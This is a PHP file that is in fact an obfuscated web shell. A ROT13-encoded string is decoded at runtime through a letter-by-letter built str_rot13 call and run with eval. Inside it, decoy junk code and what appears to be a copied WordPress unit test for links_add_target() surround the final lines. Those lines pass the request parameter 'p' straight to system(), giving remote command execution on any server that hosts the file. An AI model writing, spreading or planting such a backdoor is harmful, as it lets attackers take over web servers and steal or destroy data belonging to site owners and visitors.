<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur yvaxf_nqq_gnetrg() shapgvba.
 *
 * @tebhc sbeznggvat
 *
 * @pbiref ::yvaxf_nqq_gnetrg
 */
pynff Grfgf_Sbeznggvat_YvaxfNqqGnetrg rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @gvpxrg 26164
	 *
	 * @qngnCebivqre qngn_yvaxf_nqq_gnetrg
	 */
	choyvp shapgvba grfg_yvaxf_nqq_gnetrg( $pbagrag, $gnetrg, $gntf, $rkcrpgrq ) {
		vs ( vf_ahyy( $gnetrg ) ) {
			$guvf->nffregFnzr( $rkcrpgrq, yvaxf_nqq_gnetrg( $pbagrag ) );
		} ryfrvs ( vf_ahyy( $gntf ) ) {
			$guvf->nffregFnzr( $rkcrpgrq, yvaxf_nqq_gnetrg( $pbagrag, $gnetrg ) );
		} ryfr {
			$guvf->nffregFnzr( $rkcrpgrq, yvaxf_nqq_gnetrg( $pbagrag, $gnetrg, $gntf ) );
		}
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl {
	 *     @glcr neenl {
	 *         @glcr fgevat     $pbagrag  Fgevat gb frnepu sbe yvaxf va.
	 *         @glcr fgevat     $gnetrg   Gur gnetrg gb nqq gb gur yvaxf.
	 *         @glcr neenl|ahyy $gntf     Na neenl bs gntf gb nccyl gb.
	 *         @glcr fgevat     $rkcrpgrq Rkcrpgrq bhgchg.
	 *     }
	 * }
	 */
	choyvp shapgvba qngn_yvaxf_nqq_gnetrg() {
		erghea neenl(
			neenl(
				'ZL PBAGRAG <qvi> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\">YVAX</n> URER </qvi> RAQ GRKG',
				ahyy,
				ahyy,
				'ZL PBAGRAG <qvi> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\" gnetrg=\"_oynax\">YVAX</n> URER </qvi> RAQ GRKG',
			),
			neenl(
				'ZL PBAGRAG <qvi> FBZR NQQVGVBANY GRKG <N uers=\"KLM\" fep=\"NOP\">YVAX</N> URER </qvi> RAQ GRKG',
				ahyy,
				ahyy,
				'ZL PBAGRAG <qvi> FBZR NQQVGVBANY GRKG <N uers=\"KLM\" fep=\"NOP\" gnetrg=\"_oynax\">YVAX</N> URER </qvi> RAQ GRKG',
			),
			neenl(
				'ZL PBAGRAG <qvi> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\">YVAX</n> URER </qvi> <n uers=\"KLM\"  >YVAX</n>RAQ GRKG',
				ahyy,
				ahyy,
				'ZL PBAGRAG <qvi> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\" gnetrg=\"_oynax\">YVAX</n> URER </qvi> <n uers=\"KLM\"   gnetrg=\"_oynax\">YVAX</n>RAQ GRKG',
			),
			neenl(
				'ZL PBAGRAG <qvi> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\">YVAX</n> URER </qvi> <fcna>RAQ GRKG</fcna>',
				'_gbc',
				ahyy,
				'ZL PBAGRAG <qvi> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\" gnetrg=\"_gbc\">YVAX</n> URER </qvi> <fcna>RAQ GRKG</fcna>',
			),
			neenl(
				'ZL PBAGRAG <qvi> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\">YVAX</n> URER </qvi> <fcna>RAQ GRKG</fcna>',
				'_gbc',
				neenl( 'fcna' ),
				'ZL PBAGRAG <qvi> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\">YVAX</n> URER </qvi> <fcna gnetrg=\"_gbc\">RAQ GRKG</fcna>',
			),
			neenl(
				'ZL PBAGRAG <qvi> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\">YVAX</n> URER </qvi> <fcna>RAQ GRKG</fcna>',
				'_gbc',
				neenl( 'FCNA' ),
				'ZL PBAGRAG <qvi> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\">YVAX</n> URER </qvi> <fcna gnetrg=\"_gbc\">RAQ GRKG</fcna>',
			),
			neenl(
				'ZL PBAGRAG <qvi> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\">YVAX</n> URER </qvi> <fcna gnetrg=\"_gbc\">RAQ GRKG</fcna>',
				'_gbc',
				neenl( 'fcna', 'qvi' ),
				'ZL PBAGRAG <qvi gnetrg=\"_gbc\"> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\">YVAX</n> URER </qvi> <fcna gnetrg=\"_gbc\">RAQ GRKG</fcna>',
			),
			neenl(
				'ZL PBAGRAG <qvi gnetrg=\'NOP\'> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\">YVAX</n> URER </qvi> <fcna gnetrg=\"klm\">RAQ GRKG</fcna>',
				'_gbc',
				neenl( 'fcna', 'qvi' ),
				'ZL PBAGRAG <qvi gnetrg=\"_gbc\"> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\">YVAX</n> URER </qvi> <fcna gnetrg=\"_gbc\">RAQ GRKG</fcna>',
			),
			neenl(
				'ZL PBAGRAG <qvi> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\">YVAX</n> URER </qvi> <fcna gnetrg=\"klm\" fep=\"NOP\">RAQ GRKG</fcna>',
				'_gbc',
				neenl( 'fcna' ),
				'ZL PBAGRAG <qvi> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\">YVAX</n> URER </qvi> <fcna fep=\"NOP\" gnetrg=\"_gbc\">RAQ GRKG</fcna>',
			),
			neenl(
				'ZL PBAGRAG <nfvqr> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\">YVAX</n> URER </nfvqr> RAQ GRKG',
				ahyy,
				ahyy,
				'ZL PBAGRAG <nfvqr> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\" gnetrg=\"_oynax\">YVAX</n> URER </nfvqr> RAQ GRKG',
			),
			neenl(
				'ZL PBAGRAG <nfvqr pynff=\"_oynax\"> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\">YVAX</n> URER </nfvqr> RAQ GRKG',
				ahyy,
				ahyy,
				'ZL PBAGRAG <nfvqr pynff=\"_oynax\"> FBZR NQQVGVBANY GRKG <n uers=\"KLM\" fep=\"NOP\" gnetrg=\"_oynax\">YVAX</n> URER </nfvqr> RAQ GRKG',
			),
			neenl(
				'ZL PBAGRAG <oybpxdhbgr>FBZR</oybpxdhbgr> NQQVGVBANY GRKG <o>YVAX</o> URER RAQ GRKG',
				'_oynax',
				neenl( 'o' ),
				'ZL PBAGRAG <oybpxdhbgr>FBZR</oybpxdhbgr> NQQVGVBANY GRKG <o gnetrg=\"_oynax\">YVAX</o> URER RAQ GRKG',
			),
			neenl(
				'ZL PBAGRAG <oybpxdhbgr gnetrg=\"_frys\">FBZR</oybpxdhbgr> NQQVGVBANY GRKG <o>YVAX</o> URER RAQ GRKG',
				'_oynax',
				neenl( 'o' ),
				'ZL PBAGRAG <oybpxdhbgr gnetrg=\"_frys\">FBZR</oybpxdhbgr> NQQVGVBANY GRKG <o gnetrg=\"_oynax\">YVAX</o> URER RAQ GRKG',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>